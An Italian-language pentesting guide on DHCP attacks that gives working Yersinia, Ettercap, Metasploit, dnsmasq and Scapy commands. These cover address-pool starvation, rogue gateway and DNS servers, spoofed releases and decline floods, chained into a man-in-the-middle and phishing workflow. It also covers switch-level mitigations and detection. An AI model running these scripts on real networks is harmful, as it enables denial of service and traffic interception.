# DHCP Attacks

## Scopo

Questa guida copre gli attacchi relativi al protocollo DHCP (Dynamic Host Configuration Protocol), inclusi DHCP starvation, rogue DHCP server e DHCP spoofing.

## Prerequisiti

- Kali Linux o distribuzione con tool di pentesting
- Yersinia, Ettercap, dhcpig
- Accesso alla rete locale target
- **Autorizzazione scritta** per i test

## Installazione

```bash
sudo apt-get update
sudo apt-get install yersinia ettercap-graphical
pip install dhcpig
```

---

## Funzionamento DHCP

```
1. DISCOVER: Client broadcast cerca DHCP server
2. OFFER: Server offre IP e configurazione
3. REQUEST: Client richiede IP offerto
4. ACK: Server conferma assegnazione
```

### Porte

| Porta  |    Direzione    |
|--------|-----------------|
| 67/UDP | Client → Server |
| 68/UDP | Server → Client |

---

## DHCP Starvation

### Descrizione

Esaurisce il pool di indirizzi IP del DHCP server legittimo inviando richieste con MAC address falsificati.

### Con Yersinia

```bash
# Avvia Yersinia GUI
sudo yersinia -G

# Seleziona interfaccia
# DHCP → Launch Attack → DHCP Starvation

# CLI
sudo yersinia dhcp -attack 1 -interface eth0
```

### Con dhcpig

```bash
# Starvation attack
sudo pig.py eth0

# Con opzioni
sudo pig.py eth0 -c 100  # Limita a 100 richieste
```

### Scapy

```python
from scapy.all import *

def dhcp_starvation():
    for i in range(255):
        # MAC casuale
        mac = RandMAC()
        
        # DHCP Discover
        pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/ \
              IP(src="0.0.0.0", dst="255.255.255.255")/ \
              UDP(sport=68, dport=67)/ \
              BOOTP(chaddr=mac)/ \
              DHCP(options=[("message-type", "discover"), "end"])
        
        sendp(pkt, iface="eth0")
        
dhcp_starvation()
```

---

## Rogue DHCP Server

### Descrizione

Dopo starvation, l'attaccante diventa il DHCP server e può:

- Assegnare gateway malevolo (per MITM)
- Configurare DNS malevolo
- Fornire configurazioni errate

### Con Ettercap

```bash
# Avvia rogue DHCP
sudo ettercap -T -M dhcp:192.168.1.0/24/192.168.1.100/192.168.1.100

# Parametri:
# - Subnet: 192.168.1.0/24
# - Gateway (attacker): 192.168.1.100
# - DNS (attacker): 192.168.1.100
```

### Con Yersinia

```bash
# GUI
sudo yersinia -G
# DHCP → Launch Attack → Rogue DHCP

# CLI
sudo yersinia dhcp -attack 2 -interface eth0
```

### Metasploit

```bash
msfconsole
use auxiliary/server/dhcp
set SRVHOST 192.168.1.100
set NETMASK 255.255.255.0
set ROUTER 192.168.1.100  # Attacker come gateway
set DNSSERVER 192.168.1.100
set DHCPIPSTART 192.168.1.150
set DHCPIPEND 192.168.1.200
run
```

### Dnsmasq

```bash
# Installa
sudo apt-get install dnsmasq

# Configura /etc/dnsmasq.conf
interface=eth0
dhcp-range=192.168.1.150,192.168.1.200,12h
dhcp-option=option:router,192.168.1.100
dhcp-option=option:dns-server,192.168.1.100
dhcp-authoritative

# Avvia
sudo dnsmasq -C /etc/dnsmasq.conf -d
```

---

## DHCP Snooping Attack

### DHCP Release Spoofing

```python
from scapy.all import *

# Forza release IP della vittima
pkt = Ether(src="victim_mac", dst="ff:ff:ff:ff:ff:ff")/ \
      IP(src="0.0.0.0", dst="255.255.255.255")/ \
      UDP(sport=68, dport=67)/ \
      BOOTP(chaddr="victim_mac", ciaddr="192.168.1.10")/ \
      DHCP(options=[
          ("message-type", "release"),
          ("server_id", "192.168.1.1"),
          "end"
      ])

sendp(pkt, iface="eth0")
```

### DHCP Decline Flooding

```python
from scapy.all import *

# Rifiuta tutti gli IP offerti (DoS al DHCP)
def decline_flood():
    while True:
        mac = RandMAC()
        pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/ \
              IP(src="0.0.0.0", dst="255.255.255.255")/ \
              UDP(sport=68, dport=67)/ \
              BOOTP(chaddr=mac)/ \
              DHCP(options=[
                  ("message-type", "decline"),
                  ("requested_addr", "192.168.1.100"),
                  "end"
              ])
        sendp(pkt, iface="eth0")

decline_flood()
```

---

## Workflow Attacco Completo

```bash
# 1. Esaurisci IP pool (Starvation)
sudo yersinia dhcp -attack 1 -interface eth0

# 2. Avvia rogue DHCP
# (Configura per fornire il tuo IP come gateway/DNS)
sudo dnsmasq -C rogue.conf -d

# 3. Intercetta traffico
sudo bettercap -iface eth0
» net.sniff on

# 4. Opzionale: DNS spoofing per phishing
» dns.spoof on
```

---

## Mitigazioni

### DHCP Snooping (Switch)

```
! Cisco Switch
ip dhcp snooping
ip dhcp snooping vlan 10,20

! Trust solo sulla porta del DHCP server
interface GigabitEthernet0/1
 ip dhcp snooping trust

! Rate limit su porte client
interface GigabitEthernet0/2
 ip dhcp snooping limit rate 10
```

### Dynamic ARP Inspection

```
! Funziona con DHCP snooping
ip arp inspection vlan 10

interface GigabitEthernet0/1
 ip arp inspection trust
```

### Port Security

```
interface GigabitEthernet0/2
 switchport port-security
 switchport port-security maximum 2
 switchport port-security violation restrict
 switchport port-security mac-address sticky
```

### IP Source Guard

```
interface GigabitEthernet0/2
 ip verify source
```

### 802.1X

- Autenticazione prima dell'accesso alla rete
- Impedisce device non autorizzati

---

## Detection

### Log Analysis

```bash
# Cerca anomalie nei log DHCP
grep -i "dhcp" /var/log/syslog

# Molti DISCOVER da MAC diversi = possibile starvation
```

### Network Monitoring

```bash
# Tcpdump per DHCP
sudo tcpdump -i eth0 -n port 67 or port 68

# Wireshark filter
dhcp.option.dhcp == 1  # DISCOVER
dhcp.option.dhcp == 2  # OFFER
```

### DHCP Server Monitoring

```bash
# Monitora pool esaurito
# Alert su lease anomale (troppi lease in poco tempo)
```

---

## Best Practices

- **DHCP Snooping**: Sempre abilitato sugli switch
- **DAI**: Dynamic ARP Inspection con DHCP snooping
- **Port Security**: Limita MAC per porta
- **802.1X**: Autenticazione dispositivi
- **Monitoring**: Alert su anomalie DHCP
- **Segmentazione**: VLAN separate per servizi critici
- **Lease time**: Bilanciare sicurezza e usabilità

## Riferimenti

- [Cisco DHCP Snooping](https://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst6500/ios/12-2SX/configuration/guide/book/snoodhcp.html)
- [Yersinia Project](https://github.com/tomac/yersinia)
- [RFC 2131 - DHCP](https://tools.ietf.org/html/rfc2131)
- [MITRE ATT&CK - Rogue DHCP](https://attack.mitre.org/techniques/T1557/003/)
